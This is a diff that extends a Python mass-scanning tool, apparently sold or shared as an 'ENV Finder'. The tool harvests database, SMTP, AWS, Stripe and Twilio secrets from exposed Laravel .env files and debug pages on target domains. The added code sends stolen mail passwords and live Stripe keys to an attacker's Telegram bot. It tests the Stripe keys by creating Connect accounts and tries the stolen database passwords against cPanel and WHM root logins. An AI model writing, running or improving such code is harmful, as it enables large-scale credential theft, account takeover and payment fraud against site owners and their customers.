@@ -1,22 +1,25 @@
 import requests
 import os
 import re
+import urllib3
 import smtplib
+import stripe
 from email.mime.text import MIMEText
 from multiprocessing.dummy import Pool as ThreadPool
 from time import time as timer
 from colorama import Fore, Style, init
 from datetime import datetime
 
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+init(autoreset=True)
+LIME = Fore.LIGHTGREEN_EX
+
 # --- User Config ---
 TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
 TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'
-TEST_EMAIL_TO = 'email@gmail.com'  # Where to send test emails
-
-RESULTS_DIR = f"Results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
-
-init(autoreset=True)
-LIME = Fore.LIGHTGREEN_EX
+TEST_EMAIL_TO = 'youremail@gmail.com'  # Where to send test emails
+FROM_NAME = 'SMTP Test by Bob Marley'
+SMTP_PORTS = [25, 2525, 465, 587] # Do not Change!!!
 
 banner = f"""{LIME}{Style.BRIGHT}
 ╔════════════════════════════════════════════════════════╗
@@ -31,19 +34,137 @@ print(f"{LIME}{Style.BRIGHT}How To Use:")
 print(f"{LIME}{Style.BRIGHT}1. Prepare a text file with your target domains, one per line.")
 print(f"{LIME}{Style.BRIGHT}2. Run the script and follow the prompts.\n{Style.RESET_ALL}")
 
-# --- Helper to load or create lists from .txt files ---
-def load_or_create_list(filename, default_list):
-    try:
-        with open(filename, 'r', encoding='utf-8') as f:
-            items = f.read().splitlines()
-    except Exception:
-        with open(filename, 'w', encoding='utf-8') as f:
-            for item in default_list:
-                f.write(item + '\n')
-        items = default_list
-    return items
+RESULTS_DIR = f"Results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
 
-# --- Laravel .env paths (unchanged, always used) ---
+def strip_quotes(value):
+    if value is None:
+        return value
+    value = value.strip()
+    if (value.startswith('"') and value.endswith('"')) or (value.startswith("'") and value.endswith("'")):
+        return value[1:-1]
+    return value
+
+def send_telegram(message, parse_mode=None):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
+    if parse_mode:
+        data["parse_mode"] = parse_mode
+    try:
+        requests.post(url, data=data, timeout=10)
+    except Exception as e:
+        print(f"{Fore.LIGHTRED_EX}[TELEGRAM ERROR] {e}{Style.RESET_ALL}")
+
+def send_test_email(smtp_host, smtp_user, smtp_pass, mail_from, mail_to, url):
+    smtp_user = strip_quotes(smtp_user)
+    smtp_pass = strip_quotes(smtp_pass)
+    mail_from = strip_quotes(mail_from)
+    smtp_host = strip_quotes(smtp_host)
+    from_name = FROM_NAME
+
+    msg = MIMEText("SMTP Test Message from ENV Finder Script.")
+    msg['Subject'] = 'SMTP Test'
+    msg['From'] = f"{from_name} <{mail_from}>"
+    msg['To'] = mail_to
+
+    errors = []
+    for port in SMTP_PORTS:
+        try:
+            if port == 465:
+                server = smtplib.SMTP_SSL(smtp_host, port, timeout=10)
+            else:
+                server = smtplib.SMTP(smtp_host, port, timeout=10)
+                server.starttls()
+            server.login(smtp_user, smtp_pass)
+            server.sendmail(mail_from, [mail_to], msg.as_string())
+            server.quit()
+            print(f"{Fore.LIGHTGREEN_EX}[SMTP TEST SENT] to {mail_to} on port {port}{Style.RESET_ALL}")
+            telegram_message = (
+                f"✅ <b>SMTP Test Success</b>\n"
+                f"<b>URL:</b> <code>{url}</code>\n"
+                f"<b>MAILHOST:</b> <code>{smtp_host}</code>\n"
+                f"<b>MAILPORT:</b> <code>{port}</code>\n"
+                f"<b>MAILUSER:</b> <code>{smtp_user}</code>\n"
+                f"<b>MAILPASS:</b> <code>{smtp_pass}</code>\n"
+                f"<b>MAILFROM:</b> <code>{mail_from}</code>\n"
+                f"<b>FROMNAME:</b> <code>{from_name}</code>\n"
+                f"<b>Test sent to:</b> <code>{mail_to}</code>"
+            )
+            send_telegram(telegram_message, parse_mode="HTML")
+            return True
+        except Exception as e:
+            errors.append(f"Port {port}: {e}")
+
+    # If all ports failed
+    print(f"{Fore.LIGHTRED_EX}[SMTP TEST FAILED] on all ports: {SMTP_PORTS}{Style.RESET_ALL}")
+    error_details = "\n".join(errors)
+    telegram_message = (
+        f"❌ <b>SMTP Test Failed on All Ports</b>\n"
+        f"<b>URL:</b> <code>{url}</code>\n"
+        f"<b>MAILHOST:</b> <code>{smtp_host}</code>\n"
+        f"<b>MAILUSER:</b> <code>{smtp_user}</code>\n"
+        f"<b>MAILPASS:</b> <code>{smtp_pass}</code>\n"
+        f"<b>MAILFROM:</b> <code>{mail_from}</code>\n"
+        f"<b>FROMNAME:</b> <code>{from_name}</code>\n"
+        f"<b>Test sent to:</b> <code>{mail_to}</code>\n"
+        f"<b>Ports tried:</b> <code>{', '.join(str(p) for p in SMTP_PORTS)}</code>\n"
+        f"<b>Errors:</b>\n<pre>{error_details}</pre>"
+    )
+    send_telegram(telegram_message, parse_mode="HTML")
+    return False
+
+def validate_and_check_stripe_key(stripe_secret, url):
+    if not stripe_secret.startswith("sk_live_"):
+        return
+
+    # First, check if the key is valid by hitting the /v1/account endpoint
+    try:
+        headers = {"Authorization": f"Bearer {stripe_secret}"}
+        resp = requests.get("https://api.stripe.com/v1/account", headers=headers, timeout=10)
+        if resp.status_code != 200:
+            print(f"{Fore.LIGHTRED_EX}[STRIPE INVALID KEY] {stripe_secret}{Style.RESET_ALL}")
+            return
+    except Exception as e:
+        print(f"{Fore.LIGHTRED_EX}[STRIPE ERROR] {stripe_secret} - {e}{Style.RESET_ALL}")
+        return
+
+    # Now, test Connect capability in multiple countries
+    stripe.api_key = stripe_secret
+    countries_to_test = [
+    'US', 'GB', 'CA', 'AU', 'DE', 'FR', 'JP', 'IN', 'SG', 'NL', 'ES', 'IT', 'BR', 'SE', 'CH', 'IE', 'HK', 'MX', 'NZ', 'BE', 'AT', 'DK', 'FI', 'NO', 'PT', 'PL', 'CZ', 'RO', 'HU', 'GR', 'BG', 'HR', 'CY', 'EE', 'LV', 'LT', 'LU', 'LI', 'MY', 'MT', 'SK', 'SI'
+]
+    connect_success = False
+    for country in countries_to_test:
+        try:
+            test_account = stripe.Account.create(
+                type='express',
+                country=country,
+                email='test@example.com'
+            )
+            stripe.Account.delete(test_account.id)  # Clean up
+            connect_success = True
+            message = (
+                f"✅ <b>Stripe key Live & Connect successful</b>\n"
+                f"<b>URL:</b> <code>{url}</code>\n"
+                f"<b>KEY:</b> <code>{stripe_secret}</code>\n"
+                f"<b>Country:</b> <code>{country}</code>"
+            )
+            send_telegram(message, parse_mode="HTML")
+            with open(f"{RESULTS_DIR}/stripe_valid.txt", "a") as f:
+                f.write(f"{url} | {stripe_secret} | {country}\n")
+            print(f"{Fore.LIGHTGREEN_EX}[STRIPE CONNECT SUCCESS] {stripe_secret} ({country}){Style.RESET_ALL}")
+            break  # Stop after first success
+        except Exception as e:
+            print(f"{Fore.LIGHTYELLOW_EX}[STRIPE CONNECT FAILED] {stripe_secret} ({country}): {e}{Style.RESET_ALL}")
+
+    if not connect_success:
+        message = (
+            f"❌ <b>Stripe key Live but Connect Failed</b>\n"
+            f"<b>URL:</b> <code>{url}</code>\n"
+            f"<b>KEY:</b> <code>{stripe_secret}</code>\n"
+            f"<b>Countries tried:</b> <code>{', '.join(countries_to_test)}</code>"
+        )
+        send_telegram(message, parse_mode="HTML")
+
 path = [
     "/.env",
     "/.env.bak",
@@ -140,7 +261,17 @@ path = [
     "/backend/laravel/.env"
 ]
 
-# --- New: Load Apache, Debug, and Ports paths from .txt files ---
+def load_or_create_list(filename, default_list):
+    try:
+        with open(filename, 'r', encoding='utf-8') as f:
+            items = f.read().splitlines()
+    except Exception:
+        with open(filename, 'w', encoding='utf-8') as f:
+            for item in default_list:
+                f.write(item + '\n')
+        items = default_list
+    return items
+
 apachepath = load_or_create_list('apachepath.txt', [
     "/_profiler/phpinfo",
     "/tool/view/phpinfo.view.php",
@@ -180,14 +311,6 @@ debugpath = load_or_create_list('debugpath.txt', [
     '/debug/default/view?panel=config'
 ])
 
-porting = load_or_create_list('ports.txt', [
-    ':80',
-    ':443',
-    ':8080',
-    ':8081',
-    ':8082'
-])
-
 phpmyadmin_paths = [
     "/phpmyadmin/", "/phpMyAdmin/", "/pma/", "/PMA/", "/dbadmin/", "/mysql/", "/myadmin/"
 ]
@@ -209,7 +332,9 @@ findings = {
     "SMTP": 0,
     "STRIPE": 0,
     "TWILIO": 0,
-    "AWS": 0
+    "AWS": 0,
+    "CPANEL": 0,
+    "WHM": 0
 }
 
 def print_findings():
@@ -223,13 +348,15 @@ def print_findings():
         f"SMTP : {findings['SMTP']}  "
         f"STRIPE : {findings['STRIPE']}  "
         f"TWILIO : {findings['TWILIO']}  "
-        f"AWS : {findings['AWS']}"
+        f"AWS : {findings['AWS']}  "
+        f"CPANEL : {findings['CPANEL']}  "
+        f"WHM : {findings['WHM']}"
         f"{Style.RESET_ALL}"
     )
 
 def safe_find(pattern, text):
     m = re.search(pattern, text, re.MULTILINE)
-    return m.group(1).strip() if m else ''
+    return strip_quotes(m.group(1).strip()) if m else ''
 
 def is_env_file(text):
     env_keys = ["DB_HOST", "DB_USERNAME", "MAIL_HOST", "APP_KEY", "APP_ENV"]
@@ -238,20 +365,18 @@ def is_env_file(text):
         return True
     return False
 
-def send_telegram(message, parse_mode=None):
-    # You can implement this if you want Telegram notifications
-    pass
-
-def send_test_email(smtp_host, smtp_port, smtp_user, smtp_pass, mail_from, mail_to, from_name, url):
-    # You can implement this if you want SMTP test emails
-    return False
-
 def grab_aws(url, text):
     aws_id = safe_find(r'^AWS_ACCESS_KEY_ID\s*=\s*(.*)', text)
     aws_secret = safe_find(r'^AWS_SECRET_ACCESS_KEY\s*=\s*(.*)', text)
     aws_region = safe_find(r'^AWS_DEFAULT_REGION\s*=\s*(.*)', text)
     aws_bucket = safe_find(r'^AWS_BUCKET\s*=\s*(.*)', text)
-    if aws_id and aws_secret:
+
+    # Only save if both keys look real
+    if (
+        aws_id and aws_secret and
+        re.match(r'^(AKIA|ASIA)[A-Z0-9]{16}$', aws_id) and
+        len(aws_secret) >= 40 and not aws_secret.startswith('AWS_DEFAULT_REGION')
+    ):
         build = (
             f"URL: {url}\n"
             f"AWS_ACCESS_KEY_ID: {aws_id}\n"
@@ -292,6 +417,8 @@ def grab_ses_smtp(url, text):
             findings["SES"] += 1
             findings["SMTP"] += 1
             print(f"{Fore.LIGHTGREEN_EX}[SAVED SES SMTP] SMTP_SES.txt{Style.RESET_ALL}")
+            if TEST_EMAIL_TO:
+                send_test_email(mailhost, mailuser, mailpass, mailfrom or mailuser, TEST_EMAIL_TO, url)
             return True
     return False
 
@@ -308,7 +435,6 @@ def grab_smtp(url, text):
         fromname = safe_find(r'^MAIL_FROM_NAME\s*=\s*(.*)', text)
         if not mailuser or not mailpass or mailuser.lower() == "null" or mailpass.lower() == "null":
             return False
-        mailpass = mailpass.strip('"\'')
         build = (
             f"URL: {url}\n"
             f"MAILHOST: {mailhost}\n"
@@ -324,6 +450,8 @@ def grab_smtp(url, text):
             f.flush()
         findings["SMTP"] += 1
         print(f"{Fore.LIGHTGREEN_EX}[SAVED SMTP] {filename}{Style.RESET_ALL}")
+        if TEST_EMAIL_TO:
+            send_test_email(mailhost, mailuser, mailpass, mailfrom or mailuser, TEST_EMAIL_TO, url)
         return True
     return False
 
@@ -348,15 +476,55 @@ def grab_twilio(url, text):
 def grab_stripe(url, text):
     stripe_key = safe_find(r'^STRIPE_KEY\s*=\s*(.*)', text)
     stripe_secret = safe_find(r'^STRIPE_SECRET\s*=\s*(.*)', text)
-    if stripe_key and stripe_secret:
-        build = f'URL: {url}\nSTRIPE_KEY: {stripe_key}\nSTRIPE_SECRET: {stripe_secret}'
+    if stripe_secret and stripe_secret.startswith("sk_live_"):
+        build = f'URL: {url}\nSTRIPE_SECRET: {stripe_secret}'
         with open(f'{RESULTS_DIR}/stripe.txt', 'a', encoding='utf-8') as f:
             f.write(build + '\n\n')
             f.flush()
         findings["STRIPE"] += 1
         print(f"{Fore.LIGHTGREEN_EX}[SAVED STRIPE] stripe.txt{Style.RESET_ALL}")
+        send_telegram(f"<b>Stripe Secret Found</b>\n<pre>{build}</pre>", parse_mode="HTML")
+        validate_and_check_stripe_key(stripe_secret, url)
         return True
     return False
+
+def try_cpanel_whm(host, db_user, db_pass):
+    host = host.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
+    db_user = strip_quotes(db_user)
+    db_pass = strip_quotes(db_pass)
+    # Try cPanel
+    try:
+        url = f"https://{host}:2083/login"
+        data = {"user": db_user, "pass": db_pass}
+        resp = requests.post(url, data=data, verify=False, allow_redirects=False, timeout=10)
+        if "URL=/cpses" in resp.text:
+            entry = f"{url}|{db_user}|{db_pass}\n"
+            with open(f"{RESULTS_DIR}/cpanel.txt", "a", encoding="utf-8") as f:
+                if entry not in try_cpanel_whm.cpanel_whm_logins:
+                    f.write(entry)
+                    try_cpanel_whm.cpanel_whm_logins.add(entry)
+            findings["CPANEL"] += 1
+            print(f"{Fore.LIGHTGREEN_EX}[CPANEL VALID] {url}|{db_user}|{db_pass}{Style.RESET_ALL}")
+            send_telegram(f"<b>cPanel Login Found</b>\n<code>{url}|{db_user}|{db_pass}</code>", parse_mode="HTML")
+    except Exception:
+        pass
+    # Try WHM
+    try:
+        url = f"https://{host}:2087/login"
+        data = {"user": "root", "pass": db_pass}
+        resp = requests.post(url, data=data, verify=False, allow_redirects=False, timeout=10)
+        if "URL=/cpses" in resp.text:
+            entry = f"{url}|root|{db_pass}\n"
+            with open(f"{RESULTS_DIR}/whm.txt", "a", encoding="utf-8") as f:
+                if entry not in try_cpanel_whm.cpanel_whm_logins:
+                    f.write(entry)
+                    try_cpanel_whm.cpanel_whm_logins.add(entry)
+            findings["WHM"] += 1
+            print(f"{Fore.LIGHTGREEN_EX}[WHM VALID] {url}|root|{db_pass}{Style.RESET_ALL}")
+            send_telegram(f"<b>WHM Login Found</b>\n<code>{url}|root|{db_pass}</code>", parse_mode="HTML")
+    except Exception:
+        pass
+try_cpanel_whm.cpanel_whm_logins = set()
 
 def grab_db(site_base, url, text):
     db_conn = safe_find(r'^DB_CONNECTION\s*=\s*(.*)', text)
@@ -382,6 +550,7 @@ def grab_db(site_base, url, text):
             f.flush()
         findings["DB"] += 1
         print(f"{Fore.LIGHTGREEN_EX}[SAVED DB] Database.txt{Style.RESET_ALL}")
+        try_cpanel_whm(site_base, db_user, db_pass)
         return creds_tuple
     return None
 
@@ -434,7 +603,7 @@ def check_adminer(site_base):
                     found_adminer.add(url)
                     print(f"{Fore.LIGHTGREEN_EX}[FOUND ADM] {url}{Style.RESET_ALL}")
                     with open(f'{RESULTS_DIR}/adminer.txt', 'a', encoding='utf-8') as f:
-                        f.write(format_adminer(url, creds))
+                        f.write(format_adminer(url,creds))
                         f.flush()
                     findings["ADM"] += 1
                     print_findings()
@@ -469,47 +638,38 @@ def save_base64_appkey(url, text):
         return True
     return False
 
-# --- New: Extract sensitive config lines ---
 def extract_sensitive_config(text):
     keys = [
-        'APP_NAME', 'APP_ENV', 'APP_KEY', 'APP_DEBUG', 'APP_URL', 'ASSET_URL', 'APP_MODE', 'APP_TIMEZONE',
-        'APP_CURRENCY', 'APP_DEFAULT_LANGUAGE', 'APP_CURRENCY_SYMBOL', 'APP_CURRENCY_SYMBOL_POSITION',
-        'LOG_CHANNEL', 'LOG_LEVEL',
-        'DB_CONNECTION', 'DB_HOST', 'DB_PORT', 'DB_DATABASE', 'DB_USERNAME', 'DB_PASSWORD',
-        'REDIS_HOST', 'REDIS_PASSWORD', 'REDIS_PORT',
+        'APP_KEY', 'DB_CONNECTION', 'DB_HOST', 'DB_PORT', 'DB_DATABASE', 'DB_USERNAME', 'DB_PASSWORD',
         'MAIL_MAILER', 'MAIL_HOST', 'MAIL_PORT', 'MAIL_USERNAME', 'MAIL_PASSWORD', 'MAIL_ENCRYPTION',
         'MAIL_FROM_ADDRESS', 'MAIL_FROM_NAME',
-        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_DEFAULT_REGION',
+        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_DEFAULT_REGION', 'AWS_BUCKET',
         'STRIPE_KEY', 'STRIPE_SECRET',
-        'TWILIO_ACCOUNT_SID', 'TWILIO_AUTH_TOKEN', 'TWILIO_PHONE_NUMBER',
-        'TELNYX_API_KEY', 'TELNYX_MESSAGING_PROFILE_ID',
-        'NEXMO_KEY', 'NEXMO_SECRET'
+        'TWILIO_ACCOUNT_SID', 'TWILIO_AUTH_TOKEN', 'TWILIO_PHONE_NUMBER'
     ]
     found_lines = []
-    mail_from_address = None
-    mail_from_name = None
-    mail_mailer_smtp = False
-
     for line in text.splitlines():
         for k in keys:
-            if line.strip().upper().startswith(k):
-                if k == 'MAIL_MAILER' and 'smtp' in line.lower():
-                    mail_mailer_smtp = True
-                if k == 'MAIL_FROM_ADDRESS':
-                    mail_from_address = line
-                if k == 'MAIL_FROM_NAME':
-                    mail_from_name = line
+            if line.strip().startswith(k):
                 found_lines.append(line)
                 break
-
-    # If MAIL_MAILER=smtp, ensure MAIL_FROM_ADDRESS and MAIL_FROM_NAME are included
-    if mail_mailer_smtp:
-        if mail_from_address and mail_from_address not in found_lines:
-            found_lines.append(mail_from_address)
-        if mail_from_name and mail_from_name not in found_lines:
-            found_lines.append(mail_from_name)
-
     return '\n'.join(found_lines)
+
+def has_interesting_keys(sensitive):
+    interesting = [
+        "DB_", "MAIL_", "AWS_", "STRIPE_", "TWILIO_", "APP_KEY"
+    ]
+    return any(k in sensitive for k in interesting)
+
+saved_apache_blocks = set()
+saved_debug_blocks = set()
+
+def save_block(filename, url, sensitive, saved_blocks):
+    block = f"========================\nURL: {url}\n------------------------\n{sensitive}\n========================\n\n"
+    if block not in saved_blocks:
+        with open(f"{RESULTS_DIR}/{filename}", 'a', encoding='utf-8') as f:
+            f.write(block)
+        saved_blocks.add(block)
 
 def exploit(target):
     if '://' not in target:
@@ -553,48 +713,37 @@ def exploit(target):
         except Exception as error:
             print(f"{Fore.LIGHTRED_EX}[BAD WEBSITE] {exploit_path} ({error}){Style.RESET_ALL}")
 
-    # NEW: Check apachepath
+    # Apache paths
     for apath in apachepath:
         url = site_base.rstrip('/') + apath
         try:
             resp = requests.get(url, timeout=10)
             if resp.status_code == 200:
                 sensitive = extract_sensitive_config(resp.text)
-                if sensitive:
-                    print(f"{Fore.LIGHTGREEN_EX}[APACHE FOUND] {url}{Style.RESET_ALL}")
-                    with open(f'{RESULTS_DIR}/apache.txt', 'a', encoding='utf-8') as f:
-                        f.write("========================\n")
-                        f.write(f"URL: {url}\n")
-                        f.write("------------------------\n")
-                        f.write(sensitive + "\n")
-                        f.write("========================\n\n")
+                if sensitive and has_interesting_keys(sensitive):
+                    save_block("apache.txt", url, sensitive, saved_apache_blocks)
                     grab_aws(url, resp.text)
-        except Exception as error:
+        except Exception:
             pass
 
-    # NEW: Check debugpath
+    # Debug paths
     for dpath in debugpath:
         url = site_base.rstrip('/') + dpath
         try:
             resp = requests.get(url, timeout=10)
             if resp.status_code == 200:
                 sensitive = extract_sensitive_config(resp.text)
-                if sensitive:
-                    print(f"{Fore.LIGHTGREEN_EX}[DEBUG FOUND] {url}{Style.RESET_ALL}")
-                    with open(f'{RESULTS_DIR}/debug.txt', 'a', encoding='utf-8') as f:
-                        f.write("========================\n")
-                        f.write(f"URL: {url}\n")
-                        f.write("------------------------\n")
-                        f.write(sensitive + "\n")
-                        f.write("========================\n\n")
+                if sensitive and has_interesting_keys(sensitive):
+                    save_block("debug.txt", url, sensitive, saved_debug_blocks)
                     grab_aws(url, resp.text)
-        except Exception as error:
+        except Exception:
             pass
 
     check_phpmyadmin(site_base)
     check_adminer(site_base)
 
 def main():
+    global TEST_EMAIL_TO
     if not os.path.exists(RESULTS_DIR):
         os.makedirs(RESULTS_DIR)
 
